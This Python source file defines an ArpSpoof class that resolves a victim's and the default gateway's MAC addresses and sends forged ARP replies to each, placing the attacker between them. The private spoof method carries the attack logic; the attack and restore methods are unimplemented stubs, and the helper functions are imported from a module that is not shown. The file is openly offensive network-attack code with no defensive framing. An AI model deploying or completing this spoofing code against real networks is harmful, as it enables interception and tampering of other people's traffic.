from utils import get_our_mac_addr, get_default_gateway_ip, get_mac_addr, send_arp_packet

ARP_REPLY_OPCODE = 2

class ArpSpoof:
    def __init__(self, victim_ip: str):
        self.__our_mac = get_our_mac_addr()  # Get our MAC
        self.__victim_ip = victim_ip
        self.__victim_mac = get_mac_addr(self.__victim_ip)  # Get MAC of victim
        self.__default_gateway_ip = get_default_gateway_ip()  # Get IP of default gateway
        self.__default_gateway_mac = get_mac_addr(self.__default_gateway_ip)  # Get MAC of default gateway

    """
    This function misleading the victims by ARP-Spoofing
    Input: self.
    Output: None
    """
    def __spoof(self) -> None:
        # Make the default gateway think that I'm the victim
        send_arp_packet(ARP_REPLY_OPCODE, self.__our_mac, self.__victim_ip, self.__default_gateway_mac, self.__default_gateway_ip)
        # Make the victim think that I'm the default gateway
        send_arp_packet(ARP_REPLY_OPCODE, self.__our_mac, self.__default_gateway_ip, self.__victim_mac, self.__victim_ip)

    def attack(self) -> None:
        raise NotImplementedError("attack() must be implemented by subclass")
    def restore(self) -> None:
        raise NotImplementedError("restore() must be implemented by subclass")